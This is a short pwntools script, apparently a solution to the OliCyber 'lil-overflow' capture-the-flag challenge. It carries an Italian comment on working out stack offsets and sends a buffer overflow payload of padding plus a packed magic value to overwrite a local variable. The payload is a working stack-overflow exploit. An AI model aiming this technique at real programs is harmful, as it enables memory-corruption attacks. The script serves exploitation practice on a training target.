from pwn import *

"""
Stack[-0x20]:4 local_20 
Ignoro l'offset di ghidra, piuttosto vedo quanti byte (calcolati usando le grandezze dei type) ci sono come offset da RBP
"""

MAGIC = 0x5ab1bb0
BUFF_SIZE = 32
L20_OFFSET = 0x8

def connect():
    if args.LOCAL:
        r = process(["./lilof"])
    else:
        r = remote('lil-overflow.challs.olicyber.it', 34002)
    return r

conn = connect()

conn.recvline()

payload = (b"\x00" * BUFF_SIZE) + (b"\x00" * L20_OFFSET) + p32(MAGIC)

print("[*] Sending: {}".format(payload))
conn.sendline(payload)

conn.interactive()